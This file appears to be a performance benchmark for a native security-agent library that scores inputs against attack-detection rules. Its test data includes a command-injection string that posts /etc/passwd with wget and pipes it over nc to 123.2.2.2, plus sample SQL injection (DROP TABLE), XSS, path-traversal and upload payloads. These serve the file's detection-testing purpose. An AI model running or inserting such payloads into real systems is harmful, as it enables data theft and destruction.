'use strict';

const lib = require(bindingsPath());
let constants;
let RuleTypes; // eslint-disable-line no-unused-vars
let InputTypes;
let aLib;
let inputType;
let allRules;
let rules;


function setup(config) {
  constants = Object.assign({}, lib.constants);
  RuleTypes = Object.keys(constants.RuleType);
  InputTypes = Object.keys(constants.InputType);

  aLib = new lib.Agent();
  inputType = constants.InputType.ParameterValue;
  rules = constants.RuleType['path-traversal'];

  allRules = 0;
  for (const rule in constants.RuleType) {
    allRules |= constants.RuleType[rule];
  }
}

module.exports = {
  configure() {
    return {
      // warmupIterations: 100,
      warmupIterations: 1000,
      // groupCount: 10,
      groupCount: 50,
      // groupIterations: 100000,
      groupIterations: 100000,
      // groupWaitMS: 1000,
      groupWaitMS: 250,
    };
  },
  setup,
  groupSetup(config) {
  },
  tests: {
    noCheck(params = {}) {
      return Object.assign(params, {noop: 1});
    },
    noCheckWithFinding(params = {}) {
      return Object.assign(params, {noop: 2});
    },
    check(params = {}) {
      return Object.assign(params, {noop: 0});
    },
    short(params = {}) {
      return Object.assign(params, {input: 'input'});
    },
    long(params = {}) {
      const input = '&wget --post-file /etc/passwd; cat myFile && nc -w 3 123.2.2.2 < /etc/passwd';
      return Object.assign(params, {input});
    },
    defaultParams(params) {
      Object.assign(params, { noop: 0, input: 'input' }, params);
    },
    nothing(params) {
      this.defaultParams(params);
    },
    kitchenSink(params) {
      this.eachRuleType(params);
      this.allRuleTypes(params);
      this.eachInputType(params);
      this.collection(params);
    },
    stubScoreAtom(params) {
      this.defaultParams(params);
      lib.napi_costs(rules, params.input, inputType, {}, params.noop);
    },
    eachRuleType(params) {
      this.defaultParams(params);
      for (const rule in constants.RuleType) {
        const rules = constants.RuleType[rule];
        aLib.scoreAtom(rules, params.input, inputType, {}, params.noop);
      }
    },
    allRuleTypes(params) {
      this.defaultParams(params);
      aLib.scoreAtom(allRules, params.input, inputType, {}, params.noop);
    },
    eachInputType(params) {
      this.defaultParams(params);
      for (const type of InputTypes) {
        aLib.scoreAtom(rules, params.input, constants.InputType[type], {}, params.noop);
      }
    },
    collection(params) {
      this.defaultParams(params);
      const type = 'ParameterValue';
      const cmdInput = '&wget --post-file /etc/passwd; cat myFile && nc -w 3 123.2.2.2 < /etc/passwd';
      const attacks = [
        { rule: 'unsafe-file-upload', input: '.php.php.rar', type: 'MultipartName' },
        { rule: 'path-traversal', input: '/WEB-INF/attack', type },
        { rule: 'reflected-xss', input: '# <script>something</script>', type },
        { rule: 'sql-injection', input: '1;DROP TABLE users --', type },
        { rule: 'cmd-injection', input: cmdInput, type },
      ];

      for (const attack of attacks) {
        const { rule, input, type } = attack;
        const inputType = constants.InputType[type];
        const rules = constants.RuleType[rule];

        aLib.scoreAtom(rules, input, inputType, {}, params.noop);
      }
    },
  },
  final() {
    // eslint-disable-next-line no-console
    //console.log('tracked', trackedCount, 'untracked', untrackedCount);
  }
};

function bindingsPath() {
  const platform = process.platform;
  const { sep } = require('path');
  const fs = require('fs');

  const suffix = {
    linux: '-gnu',
    darwin: '',
    win32: '-msvc'
  }[platform];

  let bindingsPath = `${__dirname}/..${sep}contrast.${platform}-${process.arch}${suffix}.node`;
  // account for alpine (uses its own suffix).
  if (platform === 'linux' && !fs.existsSync(bindingsPath)) {
    bindingsPath = `${__dirname}/..${sep}contrast.${platform}-${process.arch}-musl.node`;
  }
  return bindingsPath;
}
